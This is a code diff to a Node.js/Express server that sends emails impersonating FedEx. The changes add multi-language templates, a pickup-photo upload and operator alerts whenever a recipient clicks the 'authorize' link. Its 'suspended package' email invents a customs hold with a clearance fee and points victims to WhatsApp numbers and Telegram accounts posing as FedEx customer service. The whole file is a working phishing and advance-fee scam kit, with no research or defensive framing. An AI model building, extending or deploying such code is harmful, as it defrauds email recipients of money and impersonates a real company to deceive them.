@@ -8,6 +8,58 @@ const path = require('path');
 const fs = require('fs');
 const cloudinary = require('cloudinary').v2;
 
+// Translation helper function - Add this after your imports in server.js
+const translations = {};
+
+// Load translation files
+const loadTranslations = () => {
+  try {
+    translations.en = require('./translations/en.json');
+    translations['pt-br'] = require('./translations/pt-br.json');
+    translations.es = require('./translations/es.json');
+    console.log('✅ Translations loaded successfully');
+  } catch (error) {
+    console.error('❌ Error loading translations:', error);
+    // Fallback to English if translation files don't exist
+    translations.en = { email: {}, result: {} };
+    translations['pt-br'] = { email: {}, result: {} };
+    translations.es = { email: {}, result: {} };
+  }
+};
+
+// Initialize translations
+loadTranslations();
+
+// Translation function with placeholder replacement
+const t = (key, lang = 'en', replacements = {}) => {
+  const keys = key.split('.');
+  let value = translations[lang] || translations.en;
+  
+  for (const k of keys) {
+    value = value?.[k];
+    if (!value) {
+      // Fallback to English if translation not found
+      value = translations.en;
+      for (const fallbackKey of keys) {
+        value = value?.[fallbackKey];
+        if (!value) break;
+      }
+      break;
+    }
+  }
+  
+  if (!value) return key; // Return key if translation not found
+  
+  // Replace placeholders like {packageName}, {specialId}
+  let translatedText = value;
+  for (const [placeholder, replacement] of Object.entries(replacements)) {
+    const regex = new RegExp(`{${placeholder}}`, 'g');
+    translatedText = translatedText.replace(regex, replacement);
+  }
+  
+  return translatedText;
+};
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -93,7 +145,10 @@ app.get('/', (req, res) => {
   res.render('index');
 });
 
-app.post('/send-task', upload.single('taskImage'), async (req, res) => {
+app.post('/send-task', upload.fields([
+  { name: 'taskImage', maxCount: 1 },
+  { name: 'pickupLocationImage', maxCount: 1 }
+]), async (req, res) => {
   try {
     console.log('Received task request');
     
@@ -108,8 +163,7 @@ app.post('/send-task', upload.single('taskImage'), async (req, res) => {
       dimensions,
       value,
       address1,
-      address2,
-      message
+      emailLanguage
     } = req.body;
 
     // Generate unique token
@@ -121,7 +175,8 @@ app.post('/send-task', upload.single('taskImage'), async (req, res) => {
       recipientEmail,
       taskName,
       expiryTime,
-      authorized: false
+      authorized: false,
+      emailLanguage: emailLanguage || 'en'
     });
 
     // Set expiry timer
@@ -130,32 +185,57 @@ app.post('/send-task', upload.single('taskImage'), async (req, res) => {
     }, 20 * 60 * 1000);
 
     let imageUrl = null;
+    let pickupLocationImageUrl = null;
     
-    // Upload to Cloudinary if image exists
-    if (req.file) {
-      console.log('Uploading image to Cloudinary...');
+    // Upload task image to Cloudinary if exists
+    if (req.files && req.files.taskImage && req.files.taskImage[0]) {
+      console.log('Uploading task image to Cloudinary...');
       try {
-        const result = await cloudinary.uploader.upload(req.file.path, {
-          folder: 'fedex-tasks',
+        const result = await cloudinary.uploader.upload(req.files.taskImage[0].path, {
+          folder: 'fedex-packages',
           quality: 'auto',
           fetch_format: 'auto'
         });
         imageUrl = result.secure_url;
-        console.log('Image uploaded to Cloudinary:', imageUrl);
+        console.log('Task image uploaded to Cloudinary:', imageUrl);
         
         // Clean up temporary file
-        fs.unlinkSync(req.file.path);
+        fs.unlinkSync(req.files.taskImage[0].path);
       } catch (uploadError) {
         console.error('Cloudinary upload failed:', uploadError);
         // Clean up temporary file even if upload fails
-        if (fs.existsSync(req.file.path)) {
-          fs.unlinkSync(req.file.path);
+        if (fs.existsSync(req.files.taskImage[0].path)) {
+          fs.unlinkSync(req.files.taskImage[0].path);
         }
-        throw new Error('Failed to upload image');
+        throw new Error('Failed to upload task image');
       }
     }
 
-    const taskData = {
+    // Upload pickup location image to Cloudinary if exists
+    if (req.files && req.files.pickupLocationImage && req.files.pickupLocationImage[0]) {
+      console.log('Uploading pickup location image to Cloudinary...');
+      try {
+        const result = await cloudinary.uploader.upload(req.files.pickupLocationImage[0].path, {
+          folder: 'fedex-pickup-locations',
+          quality: 'auto',
+          fetch_format: 'auto'
+        });
+        pickupLocationImageUrl = result.secure_url;
+        console.log('Pickup location image uploaded to Cloudinary:', pickupLocationImageUrl);
+        
+        // Clean up temporary file
+        fs.unlinkSync(req.files.pickupLocationImage[0].path);
+      } catch (uploadError) {
+        console.error('Pickup location image upload failed:', uploadError);
+        // Clean up temporary file even if upload fails
+        if (fs.existsSync(req.files.pickupLocationImage[0].path)) {
+          fs.unlinkSync(req.files.pickupLocationImage[0].path);
+        }
+        throw new Error('Failed to upload pickup location image');
+      }
+    }
+
+    const packageData = {
       recipientName,
       taskName,
       specialId: specialId || `FDX${Date.now().toString().slice(-6)}`,
@@ -166,44 +246,53 @@ app.post('/send-task', upload.single('taskImage'), async (req, res) => {
       dimensions: dimensions || 'N/A',
       value: value || 'N/A',
       address1: address1 || 'Not specified',
-      address2: address2 || 'Not specified',
       address1GoogleLink: generateGoogleMapsLink(address1),
-      address2GoogleLink: generateGoogleMapsLink(address2),
       address1MapImage: generateMapImageUrl(address1),
-      address2MapImage: generateMapImageUrl(address2),
-      message: message || 'A new task has been assigned to you.',
+      pickupLocationImageUrl: pickupLocationImageUrl,
       imageUrl: imageUrl,
       authUrl: `${req.protocol}://${req.get('host')}/authorize/${token}`,
-      token
+      token,
+      emailLanguage: emailLanguage || 'en'
     };
 
     const transporter = createTransporter();
-    const emailHtml = await generateEmailHtml(taskData);
+    const emailHtml = await generateEmailHtml(packageData);
+
+    // Use translated subject
+    const emailSubject = t('email.subject', packageData.emailLanguage, { 
+      packageName: taskName, 
+      specialId: packageData.specialId 
+    });
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: recipientEmail,
-      subject: `📦 FedEx Product Delivery - ${taskName} [${taskData.specialId}]`,
+      subject: emailSubject,
       html: emailHtml
     };
 
-    console.log('Sending email to:', recipientEmail);
+    console.log('Sending email to:', recipientEmail, 'in language:', packageData.emailLanguage);
     await transporter.sendMail(mailOptions);
     console.log('Email sent successfully!');
 
     res.json({ 
       success: true, 
-      message: 'Product notification sent successfully!',
-      specialId: taskData.specialId,
+      message: 'Package notification sent successfully!',
+      specialId: packageData.specialId,
       token: token
     });
 
   } catch (error) {
     console.error('Error in /send-task:', error);
     
-    // Clean up temporary file if it exists
-    if (req.file && fs.existsSync(req.file.path)) {
-      fs.unlinkSync(req.file.path);
+    // Clean up temporary files if they exist
+    if (req.files) {
+      if (req.files.taskImage && req.files.taskImage[0] && fs.existsSync(req.files.taskImage[0].path)) {
+        fs.unlinkSync(req.files.taskImage[0].path);
+      }
+      if (req.files.pickupLocationImage && req.files.pickupLocationImage[0] && fs.existsSync(req.files.pickupLocationImage[0].path)) {
+        fs.unlinkSync(req.files.pickupLocationImage[0].path);
+      }
     }
     
     res.status(500).json({ 
@@ -213,27 +302,29 @@ app.post('/send-task', upload.single('taskImage'), async (req, res) => {
   }
 });
 
-// Update your app.get('/authorize/:token') route
-app.get('/authorize/:token', (req, res) => {
+app.get('/authorize/:token', async (req, res) => {
   const token = req.params.token;
   const tokenData = activeTokens.get(token);
 
   if (!tokenData) {
+    const lang = 'en'; // Default to English for expired tokens
     return res.render('result', {
       success: false,
-      title: 'Link Expired',
-      message: 'This authorization link has expired or is invalid.',
-      subMessage: 'Please request a new notification.'
+      title: t('result.linkExpired', lang),
+      message: t('result.linkExpiredMessage', lang),
+      subMessage: t('result.linkExpiredSub', lang)
     });
   }
+
+  const lang = tokenData.emailLanguage || 'en';
 
   if (new Date() > tokenData.expiryTime) {
     activeTokens.delete(token);
     return res.render('result', {
       success: false,
-      title: 'Link Expired',
-      message: 'This authorization link has expired (20 minutes limit exceeded).',
-      subMessage: 'Please request a new notification.'
+      title: t('result.linkExpired', lang),
+      message: t('result.linkExpiredTime', lang),
+      subMessage: t('result.linkExpiredSub', lang)
     });
   }
 
@@ -241,19 +332,52 @@ app.get('/authorize/:token', (req, res) => {
   tokenData.authorized = true;
   activeTokens.set(token, tokenData);
 
+  // Send notification to the email_pass account
+  try {
+    const transporter = createTransporter();
+    const notificationMailOptions = {
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER,
+      subject: `🔓 Package Authorization Notification - ${tokenData.taskName || tokenData.packageName}`,
+      html: `
+        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f5f5f5;">
+          <div style="background: linear-gradient(135deg, #4d148c, #6c63ff); color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0;">
+            <h1 style="margin: 0; font-size: 24px;">FedEx Authorization Alert</h1>
+          </div>
+          <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+            <h2 style="color: #28a745; margin-bottom: 20px;">✅ Package Authorized Successfully!</h2>
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
+              <p style="margin: 10px 0;"><strong>Package:</strong> ${tokenData.taskName || tokenData.packageName}</p>
+              <p style="margin: 10px 0;"><strong>Recipient:</strong> ${tokenData.recipientEmail}</p>
+              <p style="margin: 10px 0;"><strong>Language:</strong> ${lang.toUpperCase()}</p>
+              <p style="margin: 10px 0;"><strong>Authorization Time:</strong> ${new Date().toLocaleString()}</p>
+              <p style="margin: 10px 0;"><strong>Token:</strong> ${token}</p>
+            </div>
+            <p style="color: #666;">This package has been authorized by the recipient and is ready for processing.</p>
+          </div>
+        </div>
+      `
+    };
+
+    await transporter.sendMail(notificationMailOptions);
+    console.log('Authorization notification sent to admin');
+  } catch (error) {
+    console.error('Failed to send authorization notification:', error);
+  }
+
   if (tokenData.type === 'suspended') {
     res.render('result', {
       success: true,
-      title: 'Package Authorization Successful!',
-      message: `Suspended package "${tokenData.packageName}" has been authorized for delivery.`,
-      subMessage: 'Your package will be processed for delivery after clearance verification.'
+      title: t('result.authSuccessful', lang),
+      message: t('result.suspendedAuthMessage', lang, { packageName: tokenData.packageName }),
+      subMessage: t('result.suspendedAuthSub', lang)
     });
   } else {
     res.render('result', {
       success: true,
-      title: 'Product Authorized Successfully!',
-      message: `Product "${tokenData.taskName}" has been authorized and accepted.`,
-      subMessage: 'Your product will arrive within the designated period.'
+      title: t('result.authSuccessful', lang),
+      message: t('result.authSuccessfulMessage', lang, { taskName: tokenData.taskName }),
+      subMessage: t('result.authSuccessfulSub', lang)
     });
   }
 });
@@ -275,15 +399,16 @@ app.get('/status/:token', (req, res) => {
   });
 });
 
-// Generate email HTML with embedded maps
 async function generateEmailHtml(data) {
+  const lang = data.emailLanguage || 'en';
+  
   return `
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FedEx Product Delivery</title>
+    <title>FedEx Package Delivery</title>
     <style>
         body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; }
         .container { max-width: 600px; margin: 0 auto; background: white; }
@@ -318,7 +443,6 @@ async function generateEmailHtml(data) {
 <body>
     <div class="container">
         <!-- Header -->
-        <!-- Replace the header section in your generateEmailHtml function with this: -->
         <div class="header" style="background: linear-gradient(135deg, #4d148c, #6c63ff); padding: 25px; text-align: center; border-bottom: 4px solid #ff6600;">
             <div style="font-size: 32px; font-weight: bold; margin-bottom: 10px;">
                 <span style="color: white;">Fed</span>
@@ -326,43 +450,43 @@ async function generateEmailHtml(data) {
                 <span style="color: white; font-size: 24px; vertical-align: super;">®</span>
             </div>
             <div style="color: white; font-size: 18px; opacity: 0.9; letter-spacing: 1px;">
-                PRODUCT DELIVERY NOTIFICATION
+                PACKAGE DELIVERY NOTIFICATION
             </div>
         </div>
         <!-- Content -->
         <div class="content">
             <div class="tracking-info">
-                <h2 style="margin: 0 0 10px 0; color: #4d148c;">Hello ${data.recipientName}!</h2>
-                <p style="margin: 0; font-size: 16px;">You have received a new product delivery: <strong>${data.taskName}</strong></p>
-                <p style="margin: 5px 0 0 0; color: #666;">Tracking ID: <strong>${data.specialId}</strong></p>
+                <h2 style="margin: 0 0 10px 0; color: #4d148c;">${t('email.greeting', lang, { recipientName: data.recipientName })}</h2>
+                <p style="margin: 0; font-size: 16px;">${t('email.packageReceived', lang, { packageName: data.taskName })}</p>
+                <p style="margin: 5px 0 0 0; color: #666;">${t('email.trackingId', lang, { specialId: data.specialId })}</p>
             </div>
 
-            <!-- Product Image -->
+            <!-- Package Image -->
             ${data.imageUrl ? `
             <div class="task-image">
-                <h3 style="color: #4d148c;">Product Preview</h3>
-                <img src="${data.imageUrl}" alt="Product Image" />
+                <h3 style="color: #4d148c;">${t('email.packagePreview', lang)}</h3>
+                <img src="${data.imageUrl}" alt="Package Image" />
             </div>
             ` : ''}
 
             <!-- Basic Details -->
             <div class="section">
-                <h3>📋 Basic Details</h3>
+                <h3>${t('email.basicDetails', lang)}</h3>
                 <div class="details-grid">
                     <div class="detail-item">
-                        <div class="detail-label">Product Name</div>
+                        <div class="detail-label">${t('email.packageName', lang)}</div>
                         <div class="detail-value">${data.taskName}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Special ID</div>
+                        <div class="detail-label">${t('email.specialId', lang)}</div>
                         <div class="detail-value">${data.specialId}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Priority</div>
+                        <div class="detail-label">${t('email.priority', lang)}</div>
                         <div class="detail-value priority-${data.priority.toLowerCase()}">${data.priority}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Assigned To</div>
+                        <div class="detail-label">${t('email.assignedTo', lang)}</div>
                         <div class="detail-value">${data.recipientName}</div>
                     </div>
                 </div>
@@ -370,14 +494,14 @@ async function generateEmailHtml(data) {
 
             <!-- Timeline -->
             <div class="section">
-                <h3>⏰ Timeline</h3>
+                <h3>${t('email.timeline', lang)}</h3>
                 <div class="details-grid">
                     <div class="detail-item">
-                        <div class="detail-label">Created</div>
+                        <div class="detail-label">${t('email.created', lang)}</div>
                         <div class="detail-value">${data.createdDate}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Est. Delivery Time</div>
+                        <div class="detail-label">${t('email.estimatedDelivery', lang)}</div>
                         <div class="detail-value">${data.estimatedTime}</div>
                     </div>
                 </div>
@@ -385,89 +509,69 @@ async function generateEmailHtml(data) {
 
             <!-- Specifications -->
             <div class="section">
-                <h3>📊 Specifications</h3>
+                <h3>${t('email.specifications', lang)}</h3>
                 <div class="details-grid">
                     <div class="detail-item">
-                        <div class="detail-label">Weight</div>
+                        <div class="detail-label">${t('email.weight', lang)}</div>
                         <div class="detail-value">${data.weight}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Dimensions</div>
+                        <div class="detail-label">${t('email.dimensions', lang)}</div>
                         <div class="detail-value">${data.dimensions}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Value</div>
+                        <div class="detail-label">${t('email.value', lang)}</div>
                         <div class="detail-value">${data.value}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Pickup Address</div>
+                        <div class="detail-label">${t('email.pickupAddress', lang)}</div>
                         <div class="detail-value">${data.address1}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Delivery Address</div>
-                        <div class="detail-value">${data.address2}</div>
                     </div>
                 </div>
             </div>
 
             <!-- Embedded Maps -->
-            ${(data.address1MapImage || data.address2MapImage) ? `
+            ${(data.address1MapImage || data.pickupLocationImageUrl) ? `
             <div class="section">
-                <h3>📍 Delivery Locations</h3>
+                <h3>${t('email.pickupLocation', lang)}</h3>
                 
                 ${data.address1 !== 'Not specified' && data.address1MapImage ? `
                 <div class="map-container">
-                    <div class="map-title">📍 Pickup Location: ${data.address1}</div>
-                    <img src="${data.address1MapImage}" alt="Pickup Location Map" class="map-image" />
+                    <div class="map-title">📍 ${t('email.pickupLocation', lang)}: ${data.address1}</div>
                     ${data.address1GoogleLink ? `
                     <div>
                         <a href="${data.address1GoogleLink}" target="_blank" class="map-button">
-                            🗺️ Open in Google Maps
+                            ${t('email.openGoogleMaps', lang)}
                         </a>
-                        <p class="map-instruction">Click to open this location in Google Maps for directions</p>
+                        <p class="map-instruction">${t('email.mapInstruction', lang)}</p>
                     </div>
                     ` : ''}
                 </div>
                 ` : ''}
                 
-                ${data.address2 !== 'Not specified' && data.address2MapImage ? `
+                ${data.pickupLocationImageUrl ? `
                 <div class="map-container">
-                    <div class="map-title">📍 Delivery Location: ${data.address2}</div>
-                    <img src="${data.address2MapImage}" alt="Delivery Location Map" class="map-image" />
-                    ${data.address2GoogleLink ? `
-                    <div>
-                        <a href="${data.address2GoogleLink}" target="_blank" class="map-button">
-                            🗺️ Open in Google Maps
-                        </a>
-                        <p class="map-instruction">Click to open this location in Google Maps for directions</p>
-                    </div>
-                    ` : ''}
+                    <div class="map-title">${t('email.pickupLocationPicture', lang)}</div>
+                    <img src="${data.pickupLocationImageUrl}" alt="Pickup Location Picture" class="map-image" />
+                    <p class="map-instruction">${t('email.pickupAddressCaption', lang)}</p>
                 </div>
                 ` : ''}
             </div>
             ` : ''}
 
-            <!-- Message -->
-            <div class="section">
-                <h3>💬 Message</h3>
-                <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; color: #495057;">
-                    ${data.message}
-                </div>
-            </div>
-
             <!-- Authorization Section -->
             <div class="auth-section">
-                <h3 style="margin-top: 0; color: #856404;">🔐 Authorization Required</h3>
-                <p>If this delivery was initiated by FedEx delivery team, please authorize this message to confirm receipt and acceptance.</p>
-                <a href="${data.authUrl}" class="auth-button">AUTHORIZE THIS DELIVERY</a>
-                <div class="warning">⚠️ This link will expire in 20 minutes</div>
+                <h3 style="margin-top: 0; color: #856404;">${t('email.authorizationRequired', lang)}</h3>
+                <p>${t('email.authMessage', lang)}</p>
+                <a href="${data.authUrl}" class="auth-button">${t('email.authorizeButton', lang)}</a>
+                <div class="warning">${t('email.linkExpiry', lang)}</div>
             </div>
         </div>
 
         <!-- Footer -->
         <div class="footer">
-            <p>This is an automated delivery notification from FedEx Product Delivery System</p>
-            <p>For questions, please contact your delivery coordinator</p>
+            <p>${t('email.footerText', lang)}</p>
+            <p>${t('email.footerContact', lang)}</p>
         </div>
     </div>
 </body>
@@ -475,9 +579,6 @@ async function generateEmailHtml(data) {
   `;
 }
 
-// Add this new route after your existing routes in server.js
-
-// Suspended Package Route
 app.post('/send-suspended-package', upload.single('packageImage'), async (req, res) => {
   try {
     console.log('Received suspended package request');
@@ -490,7 +591,8 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
       clearanceFee,
       customsReason,
       distributionHub,
-      contactMessage
+      contactMessage,
+      emailLanguage
     } = req.body;
 
     // Generate unique token
@@ -503,7 +605,8 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
       packageName,
       expiryTime,
       authorized: false,
-      type: 'suspended' // Mark as suspended package
+      type: 'suspended',
+      emailLanguage: emailLanguage || 'en'
     });
 
     // Set expiry timer
@@ -548,21 +651,30 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
       imageUrl: imageUrl,
       authUrl: `${req.protocol}://${req.get('host')}/authorize/${token}`,
       token,
-      whatsappNumber: '+2349032650856',
-      telegramLink: 'https://t.me/fedex_customer_service'
+      // whatsappNumber: '+2349032650856',
+      whatsappNumber: '+2348076658330',
+      telegramLink: 'https://t.me/FedEx_Customer_Service0',
+      // telegramLink: 'https://t.me/fedex_customer_service',
+      emailLanguage: emailLanguage || 'en'
     };
 
     const transporter = createTransporter();
     const emailHtml = generateSuspendedPackageEmail(packageData);
 
+    // Use translated subject
+    const emailSubject = t('email.suspendedSubject', packageData.emailLanguage, { 
+      packageName: packageName, 
+      specialId: packageData.specialId 
+    });
+
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: recipientEmail,
-      subject: `🚨 FedEx Suspended Package - ${packageName} [${packageData.specialId}]`,
+      subject: emailSubject,
       html: emailHtml
     };
 
-    console.log('Sending suspended package email to:', recipientEmail);
+    console.log('Sending suspended package email to:', recipientEmail, 'in language:', packageData.emailLanguage);
     await transporter.sendMail(mailOptions);
     console.log('Suspended package email sent successfully!');
 
@@ -588,8 +700,9 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
   }
 });
 
-// Add this function to generate suspended package email HTML
 function generateSuspendedPackageEmail(data) {
+  const lang = data.emailLanguage || 'en';
+  
   return `
 <!DOCTYPE html>
 <html>
@@ -637,86 +750,78 @@ function generateSuspendedPackageEmail(data) {
             <!-- Alert Banner -->
             <div class="alert-banner">
                 <div style="font-size: 24px; font-weight: bold; color: #856404; margin-bottom: 10px;">
-                    ⚠️ DELIVERY OF THE SUSPENDED PACKAGE!
+                    ${t('email.suspended.deliverySuspended', lang)}
                 </div>
                 <div class="status-badge">
-                    Status: Stopped at distribution hub
+                    ${t('email.suspended.statusStopped', lang)}
                 </div>
             </div>
 
             <!-- Package Image -->
             ${data.imageUrl ? `
             <div class="package-image">
-                <h3 style="color: #4d148c; margin-bottom: 15px;">Package Contents</h3>
+                <h3 style="color: #4d148c; margin-bottom: 15px;">${t('email.suspended.packageContents', lang)}</h3>
                 <img src="${data.imageUrl}" alt="Suspended Package Image" />
             </div>
             ` : ''}
 
             <!-- Package Information -->
             <div class="package-info">
-                <h3 style="color: #4d148c; margin-bottom: 20px; text-align: center;">Package Details</h3>
+                <h3 style="color: #4d148c; margin-bottom: 20px; text-align: center;">${t('email.suspended.packageDetails', lang)}</h3>
                 
                 <div class="info-grid">
                     <div class="info-item">
-                        <div class="info-label">Package Name</div>
+                        <div class="info-label">${t('email.packageName', lang)}</div>
                         <div class="info-value">${data.packageName}</div>
                     </div>
                     <div class="info-item">
-                        <div class="info-label">Special ID</div>
+                        <div class="info-label">${t('email.specialId', lang)}</div>
                         <div class="info-value">${data.specialId}</div>
                     </div>
                     <div class="info-item">
-                        <div class="info-label">Distribution Hub</div>
+                        <div class="info-label">${t('email.suspended.distributionHub', lang)}</div>
                         <div class="info-value">${data.distributionHub}</div>
                     </div>
                     <div class="info-item">
-                        <div class="info-label">Clearance Fee</div>
+                        <div class="info-label">${t('email.suspended.clearanceFee', lang)}</div>
                         <div class="info-value" style="color: #dc3545; font-weight: bold;">${data.clearanceFee}</div>
                     </div>
                 </div>
 
                 <div class="info-item" style="grid-column: 1 / -1; margin-top: 15px;">
-                    <div class="info-label">Customs Reason</div>
+                    <div class="info-label">${t('email.suspended.customsReason', lang)}</div>
                     <div class="info-value">${data.customsReason}</div>
-                </div>
-            </div>
-
-            <!-- Message Section -->
-            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 25px 0;">
-                <h3 style="color: #4d148c; margin-bottom: 15px;">Important Message</h3>
-                <div style="color: #495057; line-height: 1.6; font-size: 16px;">
-                    ${data.contactMessage}
                 </div>
             </div>
 
             <!-- Contact Section -->
             <div class="contact-section">
-                <h3 style="color: #4d148c; margin-bottom: 20px; text-align: center;">Contact Customer Service</h3>
+                <h3 style="color: #4d148c; margin-bottom: 20px; text-align: center;">${t('email.suspended.contactCustomerService', lang)}</h3>
                 
                 <div class="contact-buttons">
                     <a href="https://wa.me/${data.whatsappNumber.replace('+', '')}" class="contact-button" target="_blank">
-                        📞 WhatsApp Support
+                        ${t('email.suspended.whatsappSupport', lang)}
                     </a>
                     <a href="${data.telegramLink}" class="contact-button telegram-button" target="_blank">
-                        ✈️ Telegram Support
+                        ${t('email.suspended.telegramSupport', lang)}
                     </a>
                 </div>
                 
                 <div style="text-align: center; margin-top: 15px;">
                     <p style="color: #666; margin: 5px 0;">Phone: ${data.whatsappNumber}</p>
-                    <p style="color: #666; margin: 5px 0;">Available 24/7 for assistance</p>
+                    <p style="color: #666; margin: 5px 0;">${t('email.suspended.available247', lang)}</p>
                 </div>
             </div>
 
             <!-- Authorization Section -->
             <div style="background: #d4edda; padding: 20px; border-radius: 10px; margin: 25px 0; text-align: center;">
-                <h3 style="color: #155724; margin-bottom: 15px;">Package Authorization</h3>
-                <p style="color: #0f5132; margin-bottom: 15px;">If you have resolved the clearance issue, please authorize this package for delivery</p>
+                <h3 style="color: #155724; margin-bottom: 15px;">${t('email.suspended.packageAuthorization', lang)}</h3>
+                <p style="color: #0f5132; margin-bottom: 15px;">${t('email.suspended.resolvedClearance', lang)}</p>
                 <a href="${data.authUrl}" style="display: inline-block; padding: 12px 30px; background: #4d148c; color: white; text-decoration: none; border-radius: 6px; font-weight: bold;">
-                    ✅ AUTHORIZE PACKAGE
+                    ${t('email.suspended.authorizePackage', lang)}
                 </a>
                 <div style="color: #0f5132; font-size: 14px; margin-top: 10px;">
-                    ⚠️ This authorization link expires in 20 minutes
+                    ${t('email.suspended.authLinkExpires', lang)}
                 </div>
             </div>
         </div>
@@ -733,7 +838,7 @@ function generateSuspendedPackageEmail(data) {
 }
 
 app.listen(PORT, () => {
-  console.log(`🚀 FedEx Product System running on http://localhost:${PORT}`);
+  console.log(`🚀 FedEx Package System running on http://localhost:${PORT}`);
   console.log(`📧 Email configured for: ${process.env.EMAIL_USER || 'NOT SET'}`);
   console.log(`🔑 Email password: ${process.env.EMAIL_PASS ? 'SET ✅' : 'NOT SET ❌'}`);
   console.log(`🗺️ Using free map service (no API key required) ✅`);
